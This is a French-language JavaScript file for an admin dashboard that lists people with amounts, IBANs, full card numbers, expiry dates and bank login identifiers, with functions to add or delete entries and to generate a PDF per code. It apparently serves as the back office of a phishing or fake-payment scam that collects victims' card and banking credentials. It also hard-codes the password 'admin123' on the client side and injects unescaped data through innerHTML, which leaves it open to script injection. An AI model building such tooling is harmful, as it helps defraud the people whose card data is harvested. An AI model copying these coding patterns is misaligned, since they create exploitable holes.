// Variables globales
let currentUserToDelete = null;
const correctPassword = 'admin123';
let isAuthenticated = false;

// Importer la configuration
import config from './config.js';

// Fonction pour générer un PDF
async function generatePDF(code, nom, montant) {
    try {
        // Créer le document PDF
        const doc = new window.jspdf.jsPDF();
        // ... reste du code PDF ...
    } catch (error) {
        console.error('Erreur lors de la génération du PDF:', error);
        showNotification('Erreur lors de la génération du PDF', 'error');
    }
}

// Fonctions pour les notifications
function showNotification(message, type = 'success') {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 3000);
}

// Fonctions pour les modals
function showAddUserModal() {
    document.getElementById('addUserModal').style.display = 'flex';
}

function closeAddUserModal() {
    document.getElementById('addUserModal').style.display = 'none';
}

function showDeleteModal(code) {
    currentUserToDelete = code;
    document.getElementById('deleteModal').style.display = 'flex';
}

function closeDeleteModal() {
    currentUserToDelete = null;
    document.getElementById('deleteModal').style.display = 'none';
}

// Fonctions d'authentification
function checkAuthentication() {
    const isAuth = sessionStorage.getItem('isAuthenticated');
    if (!isAuth) {
        document.getElementById('passwordModal').style.display = 'flex';
        document.getElementById('mainContent').style.display = 'none';
        document.getElementById('mainContent').classList.remove('opacity-30', 'blur-sm');
    } else {
        isAuthenticated = true;
        document.getElementById('passwordModal').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
        document.getElementById('mainContent').classList.remove('opacity-30', 'blur-sm');
        loadUsers();
    }
}

function logout() {
    sessionStorage.removeItem('isAuthenticated');
    isAuthenticated = false;
    checkAuthentication();
}

// Fonction pour formater la date
function formatDate(dateString) {
    const date = new Date(dateString);
    const day = String(date.getDate()).padStart(2, '0');
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const year = date.getFullYear();
    const hours = String(date.getHours()).padStart(2, '0');
    const minutes = String(date.getMinutes()).padStart(2, '0');
    return `${day}/${month}/${year} à ${hours}:${minutes}`;
}

// Fonction pour créer une carte utilisateur
function createUserCard(user) {
    const card = document.createElement('div');
    card.className = 'bg-white p-6 rounded-lg shadow-md mb-4 fade-in';

    let html = `
        <div class="flex justify-between items-start">
            <div class="flex-1">
                <div class="flex items-center mb-2">
                    <h3 class="text-xl font-bold text-gray-800">${user.prenom} ${user.nom}</h3>
                    ${user.pays ? `<span class="ml-2 px-2 py-1 bg-blue-100 text-blue-800 rounded-full text-sm">${user.pays}</span>` : ''}
                </div>
                <p class="text-gray-600">Code: ${user.code}</p>
                <p class="text-green-600 font-bold">Montant: ${user.montant} €</p>
                ${user.iban ? `<p class="text-gray-600">IBAN: ${user.iban}</p>` : ''}
                <p class="text-gray-500 text-sm mt-2">Dernière modification: ${formatDate(user.derniere_modification)}</p>
            </div>
            
            <div class="flex space-x-2">
                <button onclick="generatePDF('${user.code}', '${user.nom}', ${user.montant})"
                        class="p-2 text-blue-600 hover:text-blue-800">
                    <i class="fas fa-file-pdf"></i>
                </button>
                <button onclick="showDeleteModal('${user.code}')"
                        class="p-2 text-red-600 hover:text-red-800">
                    <i class="fas fa-trash"></i>
                </button>
            </div>
        </div>`;

    // Informations bancaires si présentes
    if (user.info_bancaire) {
        html += `
        <div class="mt-4">
            <h4 class="font-semibold text-yellow-600 mb-2">💳 Carte bancaire</h4>
            <ul class="space-y-1 text-gray-600">
                <li>Titulaire: ${user.info_bancaire.titulaire}</li>
                <li>Email: ${user.info_bancaire.email}</li>
                <li>Numéro: ${user.info_bancaire.numero_carte}</li>
                <li>Expiration: ${user.info_bancaire.expiration}</li>
                <li>Date: ${formatDate(user.info_bancaire.timestamp)}</li>
            </ul>
        </div>`;
    }

    // Informations de banque si présentes
    if (user.banque) {
        html += `
        <div class="mt-4">
            <h4 class="font-semibold text-yellow-600 mb-2">🏦 Informations bancaires</h4>
            <ul class="space-y-1 text-gray-600">
                <li>Banque: ${user.banque.nom_banque}</li>
                <li>Identifiant: ${user.banque.identifiant}</li>
                <li>Date: ${formatDate(user.banque.timestamp)}</li>
            </ul>
        </div>`;
    }

    card.innerHTML = html;
    return card;
}

// Fonction pour charger les utilisateurs
async function loadUsers() {
    try {
        const response = await fetch(`${config.apiUrl}/users`);
        if (!response.ok) throw new Error('Erreur lors du chargement des données');
        
        const users = await response.json();
        const usersList = document.getElementById('usersList');
        usersList.innerHTML = '';

        users.sort((a, b) => {
            return new Date(b.derniere_modification) - new Date(a.derniere_modification);
        });

        users.forEach(user => {
            const card = createUserCard(user);
            usersList.appendChild(card);
            setTimeout(() => card.classList.add('active'), 100);
        });
    } catch (error) {
        showNotification(error.message, 'error');
    }
}

// Fonction pour confirmer la suppression
async function confirmDelete() {
    if (!currentUserToDelete) return;

    try {
        const response = await fetch(`${config.apiUrl}/users/${currentUserToDelete}`, {
            method: 'DELETE'
        });

        if (!response.ok) throw new Error('Erreur lors de la suppression');

        closeDeleteModal();
        showNotification('Utilisateur supprimé avec succès');
        loadUsers();
    } catch (error) {
        showNotification(error.message, 'error');
    }
}

// Fonction pour ajouter un utilisateur
async function addUser(formData) {
    try {
        const response = await fetch(`${config.apiUrl}/users`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData)
        });

        if (!response.ok) throw new Error('Erreur lors de l\'ajout de l\'utilisateur');

        showNotification('Utilisateur ajouté avec succès', 'success');
        closeAddUserModal();
        loadUsers();
    } catch (error) {
        showNotification(error.message, 'error');
    }
}

// Rendre les fonctions disponibles globalement
window.showAddUserModal = showAddUserModal;
window.closeAddUserModal = closeAddUserModal;
window.showDeleteModal = showDeleteModal;
window.closeDeleteModal = closeDeleteModal;
window.confirmDelete = confirmDelete;
window.generatePDF = generatePDF;
window.logout = logout;

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    // Vérifier l'authentification au chargement
    checkAuthentication();

    // Gestionnaire pour le formulaire de connexion
    document.getElementById('passwordForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const password = this.elements['password'].value;
        
        if (password === correctPassword) {
            sessionStorage.setItem('isAuthenticated', 'true');
            isAuthenticated = true;
            document.getElementById('passwordModal').style.display = 'none';
            document.getElementById('mainContent').style.display = 'block';
            loadUsers();
        } else {
            showNotification('Mot de passe incorrect', 'error');
        }
    });

    // Gestionnaire pour le formulaire d'ajout d'utilisateur
    document.getElementById('addUserForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const formData = {
            nom: this.elements['nom'].value,
            prenom: this.elements['prenom'].value,
            montant: parseFloat(this.elements['montant'].value),
            iban: this.elements['iban'].value,
            derniere_modification: new Date().toISOString()
        };

        await addUser(formData);
        this.reset();
    });
});
